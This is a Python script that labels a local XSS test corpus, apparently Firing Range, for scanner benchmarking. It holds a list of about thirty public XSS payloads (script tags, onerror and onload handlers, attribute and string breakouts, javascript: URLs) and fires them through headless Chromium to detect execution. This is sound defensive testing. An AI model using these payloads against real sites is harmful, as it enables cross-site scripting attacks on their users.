#!/usr/bin/env python3
"""
fr_oracle.py — EMPIRICAL ground truth for the Firing Range corpus.

The whole value of an independent benchmark evaporates if the labels ("this
endpoint is vulnerable, that one is safe") are assigned by the same judgement
that built the scanner. So we do not label by reasoning. We label by EXPERIMENT:

    An endpoint is VULNERABLE  <=>  a real Chromium executed attacker JS on it.

Method
------
  * A FIXED battery of well-known PUBLIC XSS vectors (OWASP XSS Filter Evasion
    Cheat Sheet / PortSwigger XSS cheat sheet shapes). The same battery is fired
    at every endpoint — no per-context tailoring, so the oracle cannot be
    accused of being tuned to any particular page.
  * Execution is detected by a real JS dialog (alert/confirm/prompt) carrying
    our canary, observed through Playwright's dialog event.
  * After load we also synthesise user interaction (click + mouseover on every
    element), because a large part of the corpus is event-handler based and a
    passive fetch would under-report.
  * The battery is fired into the query string, the fragment, AND (for the
    address/* DOM corpus) both — whichever executes first wins.

The result is a JSON label file consumed by benchmark_firingrange.py. Anything
the browser did not execute is labelled SAFE, and a scanner reporting it at
actionable severity is counted as a false positive.
"""
import json
import os
import queue
import sys
import threading
import urllib.parse

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
sys.path.insert(0, os.path.dirname(_HERE))

import fr_server  # noqa: E402

CANARY = "914771"

# ── fixed public payload battery ─────────────────────────────────────────────
# Shapes taken from the public OWASP / PortSwigger XSS cheat sheets. Ordered
# cheapest-and-most-general first so vulnerable endpoints exit early.
PAYLOADS = [
    # plain injection into markup
    f"<script>alert({CANARY})</script>",
    f"<img src=x onerror=alert({CANARY})>",
    f"<svg onload=alert({CANARY})>",
    # attribute breakout (double / single quoted)
    f'"><svg onload=alert({CANARY})>',
    f"'><svg onload=alert({CANARY})>",
    f'"><img src=x onerror=alert({CANARY})>',
    f"'><img src=x onerror=alert({CANARY})>",
    # unquoted-attribute / attribute-name injection
    f" onmouseover=alert({CANARY}) ",
    f"x onmouseover=alert({CANARY}) ",
    f'" onmouseover="alert({CANARY})',
    f"' onmouseover='alert({CANARY})",
    # tag-name / raw element injection
    f"img src=x onerror=alert({CANARY})",
    f"svg onload=alert({CANARY})",
    # rawtext / RCDATA element breakout
    f"</title><svg onload=alert({CANARY})>",
    f"</textarea><svg onload=alert({CANARY})>",
    f"</style><svg onload=alert({CANARY})>",
    f"</noscript><svg onload=alert({CANARY})>",
    f"</script><svg onload=alert({CANARY})>",
    f"</iframe><svg onload=alert({CANARY})>",
    # comment breakout
    f"--><svg onload=alert({CANARY})>",
    f"*/alert({CANARY})/*",
    f"*/alert({CANARY})//",
    # JS string breakout
    f"';alert({CANARY})//",
    f'";alert({CANARY})//',
    f"\\';alert({CANARY})//",
    f"</script><script>alert({CANARY})</script>",
    # bare JS expression (assignment / eval / event-handler contexts)
    f"alert({CANARY})",
    f";alert({CANARY});",
    # URL scheme contexts
    f"javascript:alert({CANARY})",
    # regex-literal context
    f"/;alert({CANARY})//",
]

# JS that synthesises interaction so event-handler payloads get a chance to run.
_TRIGGER_JS = """() => {
  const evs = ['click','mouseover','mousedown','mouseup','focus','load','error','toggle'];
  const all = document.querySelectorAll('*');
  for (const el of all) {
    for (const t of evs) {
      try { el.dispatchEvent(new MouseEvent(t, {bubbles:true, cancelable:true})); } catch (e) {}
    }
    try { if (typeof el.click === 'function') el.click(); } catch (e) {}
  }
  try { if (typeof window.trigger === 'function') window.trigger(location.hash.substr(1)); } catch (e) {}
}"""


# `location.hash` / `location.search` / `document.URL` hand JS the RAW,
# still-percent-encoded text. A fully-encoded payload therefore reaches a DOM
# sink as inert text (`%3Cimg%20...`) and every DOM case would look safe. Real
# DOM XSS is delivered raw, so for URL-sourced sinks we encode only what would
# break the HTTP request line or the URL structure itself.
_URL_SAFE = "<>\"'=()[]{}/\\;:,.!?*+-_~$&|^@`"


def _variants(base, path, inject, payload):
    """Where a payload can reach the page for this endpoint."""
    url = base.rstrip("/") + path
    if inject == "query:q":
        # server-side parse_qs decodes, so full encoding is correct here
        return [f"{url}?q={urllib.parse.quote(payload, safe='')}"]
    # address/* DOM corpus: the source may read search, hash, or the whole URL
    raw = urllib.parse.quote(payload, safe=_URL_SAFE)
    enc = urllib.parse.quote(payload, safe="")
    return [f"{url}#{raw}", f"{url}?{raw}", f"{url}?q={enc}#{raw}"]


def _probe_endpoint(page, base, path, inject, state):
    """Fire the battery at one endpoint. Returns (vulnerable, evidence)."""
    for payload in PAYLOADS:
        for url in _variants(base, path, inject, payload):
            state["fired"] = False
            try:
                # A navigation that differs only in the fragment is a
                # same-document navigation: Chromium would NOT re-run the page
                # scripts and every hash-sourced DOM sink would look inert.
                # Reset to about:blank so each probe is a real document load.
                page.goto("about:blank", timeout=5000)
                page.goto(url, timeout=7000, wait_until="domcontentloaded")
            except Exception:
                continue
            if state["fired"]:
                return True, {"payload": payload, "url": url, "trigger": "load"}
            try:
                page.wait_for_timeout(60)
                page.evaluate(_TRIGGER_JS)
                page.wait_for_timeout(60)
            except Exception:
                pass
            if state["fired"]:
                return True, {"payload": payload, "url": url, "trigger": "interaction"}
    return False, None


def _worker(base, work, results, lock, progress):
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch(args=["--disable-dev-shm-usage"])
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        state = {"fired": False}

        def _on_dialog(d):
            try:
                if CANARY in (d.message or ""):
                    state["fired"] = True
            except Exception:
                pass
            try:
                d.dismiss()
            except Exception:
                pass

        page.on("dialog", _on_dialog)
        page.on("pageerror", lambda e: None)
        while True:
            try:
                kind, path, inject = work.get_nowait()
            except queue.Empty:
                break
            try:
                vuln, ev = _probe_endpoint(page, base, path, inject, state)
            except Exception as exc:  # keep the sweep alive
                vuln, ev = False, {"error": str(exc)[:200]}
            with lock:
                results[path] = {"kind": kind, "inject": inject,
                                 "vulnerable": vuln, "evidence": ev}
                progress[0] += 1
                if progress[0] % 20 == 0:
                    print(f"  oracle {progress[0]}/{progress[1]} probed", flush=True)
        try:
            browser.close()
        except Exception:
            pass


def build(out_path=None, workers=6, only=None):
    base, srv = fr_server.start(0)
    eps = [e for e in fr_server.endpoints() if not only or e[0] in only]
    print(f"oracle: probing {len(eps)} endpoints with {len(PAYLOADS)} public "
          f"payloads each, {workers} browsers -> {base}", flush=True)

    work = queue.Queue()
    for e in eps:
        work.put(e)
    results, lock, progress = {}, threading.Lock(), [0, len(eps)]
    threads = [threading.Thread(target=_worker,
                                args=(base, work, results, lock, progress),
                                daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    srv.shutdown()

    n_vuln = sum(1 for v in results.values() if v["vulnerable"])
    print(f"oracle: {n_vuln} VULNERABLE / {len(results) - n_vuln} SAFE "
          f"(of {len(results)})", flush=True)

    out_path = out_path or os.path.join(_HERE, "fr_groundtruth.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump({"canary": CANARY, "payloads": PAYLOADS, "labels": results},
                  fh, indent=1, sort_keys=True)
    print(f"oracle: wrote {out_path}", flush=True)
    return results


if __name__ == "__main__":
    only = None
    for a in sys.argv[1:]:
        if a.startswith("--only="):
            only = set(a.split("=", 1)[1].split(","))
    build(only=only)
